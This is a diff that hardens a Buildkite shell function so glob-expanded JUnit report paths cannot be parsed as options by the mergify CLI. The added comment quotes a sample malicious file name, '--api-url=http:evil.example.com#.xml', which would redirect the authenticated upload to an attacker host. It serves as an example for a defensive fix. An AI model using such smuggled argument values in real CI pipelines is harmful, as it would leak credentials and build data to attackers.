@@ -37,9 +37,16 @@ run_junit_process() {
     fi
   fi
 
+  # Split on whitespace only, never glob: bash expanding a leading-wildcard
+  # report_path turns a build-produced file named e.g.
+  # `--api-url=http:evil.example.com#.xml` into an argv entry the CLI parses
+  # as an option, sending the authenticated upload to the attacker. The CLI
+  # expands the patterns itself, and `--` covers what is left.
+  local -a report_paths
+  read -ra report_paths <<<"$report_path"
+
   # Run junit-process. The CLI's own output explains upload and
   # quarantine status; propagate its exit code so the Buildkite step
   # fails when quarantine evaluation says it should.
-  # shellcheck disable=SC2086
-  mergify ci junit-process ${report_path}
+  mergify ci junit-process -- "${report_paths[@]}"
 }
